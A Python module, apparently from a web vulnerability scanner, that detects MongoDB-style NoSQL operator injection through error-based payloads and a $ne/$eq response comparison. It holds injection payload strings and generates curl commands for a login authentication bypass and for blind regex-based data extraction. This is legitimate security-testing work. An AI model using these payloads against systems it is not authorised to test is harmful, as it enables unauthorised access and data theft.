"""
nosqli_detect — detection of NoSQL injection (MongoDB-style operator injection).

Apps that build a NoSQL query straight from request parameters can be tricked into injecting query
*operators* instead of values. The canonical vector is the bracketed-operator syntax that body/query
parsers (Express `qs`, PHP, etc.) turn into a nested object: `user[$ne]=x` becomes `{user: {$ne: "x"}}`,
flipping an equality check into "not equal" — classic auth bypass and record enumeration.

For every parameter discovered by the shared crawl, Hades tries two detection techniques, cheapest
first:

1. **Error-based** — inject query-breaking values (`'`, `"`, an operator object) and match NoSQL
   driver error signatures (MongoError, BSON, `$where`, …) that our payload *introduced* (absent in
   the clean baseline), ruling out a page that always prints such text.
2. **Operator boolean split** — send `param[$ne]=<garbage>` (true for all records) against
   `param[$eq]=<garbage>` (true for none). If the two diverge — and at least one differs from the
   clean baseline — the parameter is being parsed as a query operator, not a literal value. A parser
   that ignores the bracketed key leaves both responses at baseline, so there is no false positive.

Detection only — it never extracts data or bypasses a real login. `verified` is set from the proof.
Active probing is skipped in safe mode.
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
from loguru import logger

from scanner import evidence as ev
from scanner.engine import Finding, Severity, ScanEngine

MODULE = "nosqli_detect"

# Unlikely sentinel so the $ne/$eq split is "all records" vs "no records".
_GARBAGE = "hades_nosqli_zzz"

# Error-injection values that break an unescaped NoSQL query string / JS context.
_ERROR_PAYLOADS: list[str] = ["'", '"', "';return(true);var _='", "' || '1'=='1", "{$gt: ''}"]

# NoSQL driver / query error signatures. Conservative — each names the NoSQL stack so an ordinary
# 500 or a page mentioning "error" does not false-positive.
_ERROR_RE = re.compile(
    r"MongoError|MongoServerError|MongoParseError|BSONObj|BSONError"
    r"|E11000 duplicate|unknown (?:top level )?operator|unterminated string literal"
    r"|cannot use \$|\$where|CastError|failed to parse|couldn't parse|unexpected token"
    r"|SyntaxError: .*(?:JSON|mongo)|querySrv|MongooseError",
    re.I,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject_value(url: str, param: str, payload: str) -> str:
    """Replace the parameter's value (error-based stage)."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


def _inject_op(url: str, param: str, op: str, value: str) -> str:
    """Rewrite `param=...` into the bracketed-operator form `param[$op]=value`."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params.pop(param, None)
    params[f"{param}[{op}]"] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


def _get(engine: ScanEngine, url: str) -> "httpx.Response | None":
    try:
        return engine.request("GET", url)
    except httpx.HTTPError as exc:
        logger.debug(f"nosqli_detect: {url} → {exc}")
        return None


def _similar(a: str, b: str, tol: float = 0.05) -> bool:
    la, lb = len(a), len(b)
    return abs(la - lb) / max(la, lb, 1) <= tol


def _detect_error(text: str) -> str | None:
    m = _ERROR_RE.search(text)
    return m.group(0) if m else None


_VERIFY_NOTE = {
    "error-based":    "NoSQL driver error signature introduced by our payload (absent in baseline)",
    "operator split": "param[$ne] and param[$eq] diverged — the value is parsed as a query operator",
}


def _exploitation_steps(url: str, param: str) -> list[dict]:
    ne = _inject_op(url, param, "$ne", _GARBAGE)
    return [
        {"step": 1, "description": "Confirm operator injection: return all records with $ne.",
         "command": f'curl -sk "{ne}"'},
        {"step": 2, "description": "Authentication bypass attempt on a login endpoint (authorised use).",
         "command": ("curl -sk -X POST '<login>' -H 'Content-Type: application/json' "
                     "--data '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'")},
        {"step": 3, "description": "Blind data extraction with a regex oracle ($regex), one char at a time.",
         "command": f'curl -sk "{_inject_op(url, param, "$regex", "^a")}"'},
    ]


def _finding(url: str, param: str, technique: str, payload: str,
             evidence: list[str]) -> Finding:
    proof_url = _inject_op(url, param, "$ne", _GARBAGE) if technique == "operator split" \
        else _inject_value(url, param, payload)
    return Finding(
        module=MODULE,
        title=f"NoSQL Injection ({technique}): {param}",
        description=(f"Parameter '{param}' in {url} is vulnerable to NoSQL injection via {technique}. "
                     f"Payload: {payload!r}. An attacker can bypass authentication, enumerate records, "
                     "or blind-extract data by injecting query operators (e.g. $ne, $gt, $regex)."),
        severity=Severity.HIGH,
        recommendation=("Cast request values to the expected type before querying, reject objects where "
                        "a scalar is expected, and never pass raw request data into query filters. For "
                        "MongoDB use strict schema validation and disable server-side JS ($where)."),
        raw={"url": url, "parameter": param, "technique": technique, "payload": payload,
             "proof_url": proof_url, "confidence": "high", "verified": True,
             "verification": _VERIFY_NOTE.get(technique, "active NoSQL injection confirmed"),
             "evidence": evidence, "exploitation": _exploitation_steps(url, param)},
    )


def _evidence(param: str, payload: str, resp: "httpx.Response | None" = None,
              indicator: str = "") -> list[str]:
    lines = [f"injected into URL parameter '{param}': {ev.note(payload)[:80]}"]
    if resp is not None:
        lines += ev.from_response(resp, indicator=indicator)
    elif indicator:
        lines.append(f"matched: {ev.note(indicator)}")
    return lines


# ---------------------------------------------------------------------------
# Per-parameter test (error → operator split)
# ---------------------------------------------------------------------------

def _test_param(engine: ScanEngine, url: str, param: str) -> Finding | None:
    base = _get(engine, url)
    base_has_error = base is not None and _detect_error(base.text) is not None

    # 1. Error-based — the NoSQL error must be INTRODUCED by our payload, not already present.
    if not base_has_error:
        for payload in _ERROR_PAYLOADS:
            resp = _get(engine, _inject_value(url, param, payload))
            if resp and (sig := _detect_error(resp.text)):
                return _finding(url, param, "error-based", payload,
                                _evidence(param, payload, resp,
                                          f"NoSQL error signature appeared: {sig} (absent in baseline)"))

    # 2. Operator boolean split: $ne (match-all) vs $eq (match-none).
    if base is not None:
        r_ne = _get(engine, _inject_op(url, param, "$ne", _GARBAGE))
        r_eq = _get(engine, _inject_op(url, param, "$eq", _GARBAGE))
        if r_ne is not None and r_eq is not None:
            diverge = not _similar(r_ne.text, r_eq.text)
            moved = (not _similar(r_ne.text, base.text)) or (not _similar(r_eq.text, base.text))
            if diverge and moved:
                return _finding(
                    url, param, "operator split", f"{param}[$ne]={_GARBAGE}",
                    _evidence(param, f"{param}[$ne] vs {param}[$eq]", r_ne,
                              f"$ne ({len(r_ne.text)}B) diverged from $eq ({len(r_eq.text)}B); "
                              f"baseline {len(base.text)}B — operator is parsed as a query filter"))
    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(engine: ScanEngine) -> list[Finding]:
    if engine.is_safe_mode():
        logger.info("nosqli_detect: safe mode — skipping active injection")
        return [Finding(MODULE, "NoSQL Injection Scan Skipped (Safe Mode)",
                        "Active NoSQLi probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    candidate_urls = list(engine.get_crawl().parametrised_urls)
    if urlparse(engine.url).query and engine.url not in candidate_urls:
        candidate_urls.insert(0, engine.url)

    if not candidate_urls:
        return [Finding(MODULE, "NoSQL Injection: No Parametrised URLs Found",
                        "No URLs with query parameters were discovered to test.",
                        Severity.INFO, "", {"scanned_url": engine.url, "confidence": "high"})]

    seen: set[str] = set()
    work: list[tuple[str, str]] = []
    for url in candidate_urls:
        for param in parse_qs(urlparse(url).query, keep_blank_values=True):
            if param not in seen:
                seen.add(param)
                work.append((url, param))

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        futures = {pool.submit(_test_param, engine, url, param): (url, param) for url, param in work}
        for future in as_completed(futures):
            result = future.result()
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "NoSQL Injection: None Detected",
                        f"Tested {len(work)} parameter(s) with error-based and operator-split techniques. "
                        "No injection was detected.",
                        Severity.INFO, "", {"params_tested": len(work), "confidence": "high"})]
    return findings
